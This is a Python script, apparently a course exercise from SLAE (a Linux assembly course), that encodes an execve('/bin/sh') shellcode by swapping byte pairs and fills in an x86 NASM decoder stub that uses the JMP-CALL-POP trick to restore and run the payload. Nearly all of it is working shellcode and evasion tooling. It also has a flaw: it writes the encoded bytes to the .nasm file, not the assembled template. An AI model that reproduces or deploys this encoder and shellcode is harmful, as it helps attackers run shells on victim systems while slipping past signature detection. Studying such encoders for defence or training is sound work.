# Paolo Stagno aka [VoidSec](https://voidsec.com)
# SLAE-1511
#!/usr/bin/env python
import binascii
execve_shellcode = bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80")
if (len(execve_shellcode)%2)!=0:
#must be padded at an even number
	execve_shellcode.append(0x90)
execve_shellcode = bytearray(execve_shellcode)
shellcode_len=len(execve_shellcode)
print("[>] Shellcode Length: {}".format(shellcode_len))
orig=[]
swapped=[]
x=0
for i in execve_shellcode:
	orig.append(i)
while x<shellcode_len:
	swapped.append(execve_shellcode[x+1])
	swapped.append(execve_shellcode[x])
	x+=2
print("[>] Original shellcode:\n--------------------------")
print(orig)
print("\n[>] Encoded Shellcode:\n--------------------------")
print(swapped)
swapped=binascii.hexlify(bytearray(swapped))
swapped="0x"+"0x".join(a+b for a,b in zip(swapped[::2], swapped[1::2]))
swapped=", ".join(swapped[i:i+4] for i in range(0, len(swapped), 4))
print("\n[>] Nasm:\n--------------------------\n{}").format(swapped)
nasm="""
; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

global _start

section .text
_start:
	jmp short shellcode_section		; goto shellcode_section

decoder:					; decoder's main
	pop esi					; load address of our encoded shellcode (encoded_shellcode) into ESI (JMP CALL POP trick)
	mul ecx					; trick to clear eax and exc
	mov cl, {}				; loop half the times of our shellcode length as we are swapping two bytes at time (eg. shellcode length is 20)

decode_loop:
	mov  al, byte [esi]			; load encoded_shellcode's byte pointed by ESI in al 	| [A][B] al=A
	xchg byte [esi+1], al			; swap al value with next byte value (ESI+1) 		| [A][A] al=B
	mov [esi], al				; load swapped byte in al to location pointed by ESI	| [B][A]
        add esi, 2				; select next byte "couple"				
        loop decode_loop			; cl is 0? No, we go back at decode_loop and execute the cicle again
        jmp short encoded_shellcode		; cl is 0, we've decoded all our shellcode and we can now directly jump into it

shellcode_section:
        call decoder				; goto decoder's main, putting encoded_shellcode on the stack
        encoded_shellcode: db {}
""".format(shellcode_len/2,swapped)
f=open("swapper_shellcode.nasm","w")
f.write(swapped)
f.close()